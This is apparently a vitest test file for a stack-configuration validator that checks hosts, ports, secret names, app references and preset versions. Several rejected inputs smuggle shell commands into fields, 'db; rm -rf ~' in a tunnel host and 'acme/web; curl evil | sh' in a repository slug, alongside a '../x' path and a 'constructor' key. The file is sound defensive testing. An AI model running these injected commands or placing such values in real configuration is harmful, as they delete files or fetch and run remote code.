import { expect, test } from 'vitest';
import { SECRET_TYPES, StackSchema, validateStack, type Stack } from './stack.ts';

const app = { name: 'Orders API', kind: 'dotnet', slug: 'acme/orders-api' };
const stack = (extra: object = {}) => ({
  envs: ['qa', 'prod'],
  apps: { orders: app, web: { ...app, name: 'Web' } },
  ...extra,
});
const web = (extra: object) => stack({ apps: { orders: app, web: { ...app, ...extra } } });

test('a stack that can be used has nothing wrong with it, and is typed', () => {
  const full = stack({
    name: 'Acme Shop',
    protected: ['prod'],
    envAliases: { qa: ['test', 'dev'] },
    kinds: { elixir: { label: 'Elixir', detect: ['mix.exs'], start: 'mix phx.server' } },
    queues: { thumbs: { name: 'Thumbnails', type: 'sqs', queue: 'thumbs-qa', envs: { prod: { queue: 'thumbs' } } } },
    checks: [{ name: 'vpn', run: 'pgrep -x vpnd' }],
    presets: [{ name: 'Both', version: 1, nodes: { orders: {}, web: {} }, edges: [{ from: 'web', to: 'orders' }] }],
    apps: {
      orders: {
        ...app,
        url: 'https://localhost:7001',
        prereqs: [{ sso: 'acme-qa' }, { tunnel: 'db.qa.acme.example', port: 5432, env: 'ConnectionStrings__Db' }],
        secrets: [{ env: 'ConnectionStrings__Db', type: 'postgres' }],
        publishes: { thumbs: {} },
        envs: { prod: { prereqs: [{ tunnel: 'db.acme.example', port: 5432 }], start: 'dotnet run' } },
        localChanges: [{ file: 'src/Startup.cs', find: 'a', replace: 'b' }],
      },
      web: { name: 'Web', kind: 'elixir', slug: 'acme/web', consumes: { orders: { how: 'env', env: ['ORDERS_URL'] } } },
      crm: { name: 'CRM', kind: 'other', outside: 'a SaaS' },
    },
  });
  expect(validateStack(full)).toEqual([]);
  const typed: Stack = StackSchema.parse(full);
  expect(typed.apps['orders']?.prereqs?.[1]?.port).toBe(5432);
  // What the schema does not name is kept as it is.
  expect(StackSchema.parse(stack({ notes: 'read me first' }))).toMatchObject({ notes: 'read me first' });
});

test('whatever it is given, it answers with reasons and never throws', () => {
  for (const notAStack of [null, undefined, 3, 'text', [], () => 1])
    expect(validateStack(notAStack)).toEqual(['a stack is an object with envs and apps']);
  expect(validateStack({})).toEqual([
    'envs: a non-empty list of lowercase names, each once',
    'apps: an object keyed by app id',
  ]);
  expect(validateStack({ envs: ['qa'], apps: { web: 7, api: { name: 'API' } } })).toEqual([
    'apps.web: an object',
    'apps.api.kind: required',
    'apps.api.slug: required',
  ]);
});

test('each part is named where it is wrong', () => {
  const cases: [object, string][] = [
    [web({ prereqs: [{ tunnel: 'db; rm -rf ~', port: 5432 }] }), 'apps.web.prereqs[0].tunnel: a host name'],
    [web({ prereqs: [{ port: '5432' }] }), 'apps.web.prereqs[0].port: a port number from 1 to 65535'],
    [
      web({ envs: { prod: { prereqs: [{ port: 70000 }] } } }),
      'apps.web.envs.prod.prereqs[0].port: a port number from 1 to 65535',
    ],
    [web({ secrets: [{ env: 'DB URL' }] }), 'apps.web.secrets[0].env: a setting name'],
    [
      web({ secrets: [{ env: 'DB', type: 'oracle' }] }),
      `apps.web.secrets: type "oracle" is not one Koppler tests (${SECRET_TYPES.join(', ')})`,
    ],
    [
      web({ secrets: [{ env: 'NODE_OPTIONS' }] }),
      'apps.web: "NODE_OPTIONS" cannot be a secret or a cable setting; it changes what code the app runs',
    ],
    [web({ consumes: { ghost: {} } }), 'apps.web.consumes.ghost: no such app'],
    [web({ consumes: { constructor: {} } }), 'apps.web.consumes.constructor: no such app'],
    [web({ envs: { staging: {} } }), 'apps.web.envs.staging: not one of envs (qa, prod)'],
    [web({ start: 'x'.repeat(2001) }), 'apps.web.start: a shell command (up to 2000 characters)'],
    [
      web({ localChanges: [{ file: '../x', find: 'a', replace: 'b' }] }),
      "apps.web.localChanges[0]: needs file (a path inside the app's clone, no .. or leading /), find and replace",
    ],
    [web({ slug: 'acme/web; curl evil | sh' }), 'apps.web.slug: owner/repo, or host/path/to/repo'],
    [
      stack({ protected: ['live'] }),
      'protected: a list of environments from envs (the ones that ask before every secret read and get the careful review)',
    ],
    [stack({ kinds: { go: { label: 'Mine' } } }), 'kinds.go: Koppler already has a kind with this id'],
    [
      stack({ queues: { q: { name: 'Q', type: 'rabbit' } } }),
      'queues.q.type: one of sqs, sns, eventbridge, kafka, other',
    ],
    [
      stack({ checks: [{ name: 'vpn' }] }),
      'checks[0]: needs a name (up to 80 characters) and a run command (up to 2000)',
    ],
    [
      stack({ presets: [{ name: 'P', version: 99, nodes: { orders: {} } }] }),
      'presets[0].version: 99 is newer than this Koppler reads (1); update Koppler',
    ],
    [
      stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: [{ from: 'orders', to: 'web' }] }] }),
      'presets[0].edges: orders -> web needs both apps in the preset',
    ],
  ];
  for (const [bad, problem] of cases) expect(validateStack(bad), problem).toContain(problem);
});
